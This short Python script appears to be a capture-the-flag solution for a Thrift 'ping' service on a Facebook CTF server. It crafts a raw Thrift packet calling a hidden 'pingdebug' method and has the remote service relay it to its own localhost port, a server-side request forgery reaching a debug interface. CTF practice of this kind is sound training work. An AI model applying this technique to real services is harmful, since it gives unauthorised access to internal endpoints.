from ptrlib import p32
import thriftpy
from thriftpy.rpc import make_client

ping = thriftpy.load(
    'ping.thrift', module_name="ping_thrift"
)
Ping = ping.Ping
Pong = ping.Pong
Debug = ping.Debug
PongDebug = ping.PongDebug
PingBot = ping.PingBot
Proto = ping.Proto

if __name__ == '__main__':
    client = make_client(PingBot, "challenges.fbctf.com", 9090)
    packet = b"\x80\x01\x00\x01"
    packet += p32(len("pingdebug"), order='big')
    packet += b"pingdebug"
    packet += b"\x00\x00\x00\x00\x0c\x00\x01\x08\x00\x01\x00\x00\x00\x7b\x00\x00"
    arg = Ping(Proto.TCP, "localhost:9090", packet)
    pong = client.ping(arg)
    print(pong)
